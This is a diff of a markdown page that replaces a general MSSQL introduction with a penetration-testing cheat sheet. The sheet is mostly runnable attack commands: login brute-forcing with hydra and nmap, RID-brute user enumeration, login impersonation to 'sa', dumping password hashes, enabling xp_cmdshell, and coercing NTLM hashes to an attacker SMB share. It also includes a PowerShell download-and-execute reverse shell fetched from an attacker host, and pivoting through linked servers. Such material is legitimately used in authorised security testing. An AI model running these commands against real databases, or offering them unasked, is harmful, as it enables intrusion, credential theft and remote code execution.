@@ -1,57 +1,43 @@
-**Microsoft SQL Server (MSSQL)** is a relational database management system developed by Microsoft. It is widely used in enterprise environments for storing and managing structured data. MSSQL supports powerful querying capabilities through Transact-SQL (T-SQL), and it can be accessed remotely over the network using TCP port **1433** by default.
+> Notes copied from [routezero.security](https://routezero.security/2025/03/29/mssql-cheat-sheet-for-penetration-testers/)
+
+Microsoft SQL Server (MSSQL) is a common target in penetration testing due to misconfigurations, weak credentials, and privilege escalation opportunities. This cheat sheet provides enumeration techniques, privilege escalation methods, and exploitation tactics useful for pentesters and red teamers.
 
 ---
 
-## Enumerating MSSQL with Nmap
+## 1. Connecting to MSSQL
 
-### Scan for MSSQL Service and Scripts
-
-```bash
-nmap -p 1433 --script ms-sql-info <target>
-```
-
-- Detects MSSQL version and configuration
-
-### Brute Force SQL Authentication
+- **Using** `sqsh` **(Linux)**
+Connects to an MSSQL server using a specified username and password.
 
 ```bash
-nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt <target>
+sqsh -S target-ip -U user -P password
 ```
 
-- Attempts to brute-force login credentials
 
-
----
-
-## Connecting to MSSQL from Kali Linux
-### Using mssqlclient.py from Impacket
+- **Using** `impacket-mssqlclient`
+Connects to MSSQL using Impacket’s `mssqlclient.py`.
 
 ```bash
-python3 mssqlclient.py <username>:<password>@<host> 
+python3 mssqlclient.py DOMAIN/user:password@target-ip
 ```
 
-- Supports both SQL and Windows authentication
-- Useful for enumeration and command execution if xp_cmdshell is enabled
 
-
-
-### Using sqlcmd 
-
+- **Using PowerShell (Windows)**
+Connects to MSSQL using Impacket’s `sqlcmd`.
 ```bash
-sqlcmd -S <host> -U <username> -P <password>
+sqlcmd -S target-ip -U user -P password
 ```
 
-- `-S`: Server address
-- `-U`: Username
-- `-P`: Password
+If you have access to the machine where the DB is allocated, you can interact with it without creating an interactive shell.
 
-Once connected, you can run T-SQL commands interactively.
+```powershell
+sqlcmd -S .\SQLEXPRESS -E -Q "SELECT * FROM CredentialsDB.dbo.Credentials"
+```
 
 
 ---
 
-## Common T-SQL Commands
-
+## 2. Enumerating MSSQL
 - **List all databases**:
 
 ```sql
@@ -111,14 +97,107 @@ EXEC xp_cmdshell 'whoami';
 
 ---
 
-## Importing or Restoring MSSQL Databases
+## 3. Credential Hunting & Privilege Escalation
 
-If you have a `.bak` file (backup), you can restore it using SQL Server Management Studio (SSMS) or T-SQL:
+- **Enumerate local users**
+Retrives the machine local users using mssql.
 
-```sql
-RESTORE DATABASE [db_name]
-FROM DISK = 'C:\path\to\backup.bak'
-WITH MOVE 'db_name_Data' TO 'C:\MSSQL\Data\db_name.mdf',
-MOVE 'db_name_Log' TO 'C:\MSSQL\Data\db_name.ldf';
+```bash
+nxc mssql <target> -u <user> -p <password> --rid-brute 10000 --local-auth
+```
+
+- **User Impersonation**
+This command verifies whether the current user has permission to perform privilege escalation using the `mssql_priv` module of NetExec.
+
+```bash
+nxc mssql <target_ip> -u <user> -p <password> -M mssql_priv --local-auth
+```
+
+In the output, it will show us which user can be impersonated if impersonation is possible. Then, to perform the escalation, you can use:
+
+```bash
+EXECUTE AS LOGIN = '<target_user>';
+```
+
+- **Finding Stored Credentials**
+Retrieves stored password hashes (if accessible).
+
+```
+SELECT name, password_hash FROM sys.sql_logins;
+```
+
+
+- **Enabling** `xp_cmdshell` **for Command Execution**
+Enables `xp_cmdshell` to execute system commands.
+
+```
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+```
+
+
+- **Executing System Commands with** `xp_cmdshell`
+Runs system commands with MSSQL privileges.
+
+```
+EXEC xp_cmdshell 'whoami';
+```
+
+- **Capturing MSSQL Service Hash**
+Force MSSQL to authenticate to attacker's SMB share
+
+```
+# Start Responder on attacker machine
+sudo responder -I eth0
+
+# On MSSQL
+EXEC xp_dirtree '\\attacker-ip\share';
+EXEC xp_fileexist '\\attacker-ip\share\file';
+
+# Or using xp_subdirs
+EXEC master..xp_subdirs '\\attacker-ip\share';
+```
+
+---
+
+## 4. Exploiting MSSQL for Lateral Movement
+
+- **Using MSSQL for Reverse Shell**
+Executes a PowerShell-based reverse shell.
+
+```
+EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/rev.ps1')"';
+```
+
+- **Abusing MSSQL Linked Servers**
+Lists linked servers (potential pivoting points).
+
+```
+EXEC sp_linkedservers;
+```
+
+
+- **Executing Commands on Linked Servers**
+Runs commands on a linked MSSQL server.
+
+```
+EXEC ('whoami') AT linked_server_name;
+```
+
+- **Impersonate sysadmin user**
+This command impersonates the sysadmin user
+```
+EXECUTE AS LOGIN = 'sa';SELECT SYSTEM_USER;SELECT IS_SRVROLEMEMBER('sysadmin');
+```
+
+---
+
+## 5. Brute-Forcing MSSQL Credentials
+
+- **Using** `hydra`
+Attempts brute-force login.
+
+```bash
+hydra -L users.txt -P passwords.txt mssql://target-ip
 ```
 
